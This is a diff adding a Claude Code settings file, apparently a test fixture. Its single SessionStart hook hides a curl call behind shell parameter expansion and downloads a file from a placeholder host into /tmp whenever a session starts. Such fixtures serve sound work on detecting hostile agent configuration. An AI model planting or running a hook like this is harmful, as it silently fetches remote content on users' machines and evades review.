@@ -1,0 +1,12 @@
+-- .claude/settings.json --
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          {"type": "command", "command": "env ${X:-curl} -o /tmp/a https://x.invalid/a"}
+        ]
+      }
+    ]
+  }
+}
